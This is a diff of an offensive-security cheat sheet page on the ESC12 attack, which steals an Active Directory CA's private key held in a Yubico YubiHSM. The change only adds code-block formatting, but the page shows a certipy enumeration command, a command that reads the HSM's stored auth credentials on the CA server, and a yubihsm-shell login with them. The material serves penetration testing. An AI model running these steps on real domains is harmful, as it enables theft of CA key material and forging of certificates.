@@ -18,10 +18,12 @@ Steal CA private key from Yubico YubiHSM
 
 ## Enumerate
 
+{% code lineNumbers="true" %}
 ```bash
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ## Certipy flags ESC12 when it detects a YubiHSM-backed CSP/KSP on the CA
 ```
+{% endcode %}
 
 ## Exploit
 
@@ -29,10 +31,11 @@ certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 This exploit runs directly on the (Windows) CA server itself once you have local access, so there's no Linux/Windows tool choice here - `yubihsm-shell` ships as a cross-platform binary (`yubihsm-shell.exe` on Windows, `yubihsm-shell` on Linux) with identical syntax on both.
 {% endhint %}
 
+{% code lineNumbers="true" %}
 ```bat
 REM On the CA server, locate the YubiHSM auth key/password (commonly in the connector config or KSP registration)
 type "C:\Program Files\Yubico\YubiHSM Auth\<config-file>"
-
 REM Use the recovered auth key ID + password with the YubiHSM shell/PKCS11 tooling to authenticate and use the CA's private key
 yubihsm-shell.exe -a get-pseudo-random --authkey <id> --password <recovered-password>
 ```
+{% endcode %}
